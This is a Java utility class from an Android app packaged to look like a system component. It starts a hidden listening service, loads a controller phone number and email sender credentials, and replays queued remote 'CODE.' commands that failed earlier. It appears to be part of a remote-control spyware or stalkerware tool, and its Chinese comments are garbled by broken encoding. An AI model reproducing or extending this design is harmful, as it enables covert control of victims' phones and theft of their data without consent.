package com.android.system.controled.util;

import java.util.ArrayList;

import android.content.Context;
import android.content.Intent;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;
import com.android.system.controled.bean.ConfigInfo;
import com.android.system.controled.db.InnerDbOpera;
import com.android.system.controled.service.ListenService;

public class InitUtil {

	private static final int MAX_OPERAS = 5;

	/**
	 * ��ʼ����check
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-9-9
	 */
	public static void init(Context context) {
		// initConfig(context);
		checkBackService(context);
		checkUploadedOrNot(context);
	}

	/**
	 * ��ȡ������Ϣ
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-9-9
	 */
	public static void initConfig(Context context) {
		ConfigInfo config = XmlUtil.getConfigInfo(context);
		MainApplication.getInstence().setControllerTel(config.getControllerTel());
		MainApplication.getInstence().setSenderEmailAddr(config.getSenderEmailAddr());
		MainApplication.getInstence().setSenderPwd(config.getSenderPwd());
		MainApplication.getInstence().setReceiverEmailAddr(config.getReceiveEmailAddr());
	}

	/**
	 * ������̨��������
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zgy
	 * @date:2012-8-30
	 */
	private static void checkBackService(Context context) {

		// ContactsUtil.createContactsFile(context);//����

		if (!ServiceUtil.isServiceStarted(context, MainApplication.SERVICE_NAME_LISTEN)) {
			Intent i = new Intent(context, ListenService.class);
			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startService(i);
			Debug.v("service", "service is not running, need to start service!");
		} else {
			Debug.v("service", "service is running, no need to start service!");
		}

	}

	/**
	 * ����Ƿ���δ�ϴ��ɹ��ļ�¼
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-9-9
	 */
	private static void checkUploadedOrNot(Context context) {

		InnerDbOpera dbOperater = InnerDbOpera.getInstence();

		// ÿ��ִֻ������δ�ɹ���������˵��ظ��������������������
		ArrayList<Code> codesFailed = new ArrayList<Code>();
		codesFailed = dbOperater.getCodeFailedNotRepeatedNoNeedRedoRecently();

		ArrayList<Code> codesFailedSelected = new ArrayList<Code>();

		if (codesFailed != null && codesFailed.size() > 0) {
			for (Code code : codesFailed) {
				if (codesFailedSelected.size() < MAX_OPERAS) {
					if (codesFailedSelected.contains(code)) {
						code.setResult(Code.RESULT_CODE_REPEAT);
						dbOperater.updateCodeResult(code);
					} else if (code.getRedoNeed() == Code.REDO_NEED) {
						codesFailedSelected.add(code);
					}
				} else {
					break;
				}
			}
		}

		for (Code code2 : codesFailedSelected) {
			DoAboutCodeUtils.doOperaByMessage(context, "CODE." + code2.getCode(), code2);
		}
	}
}
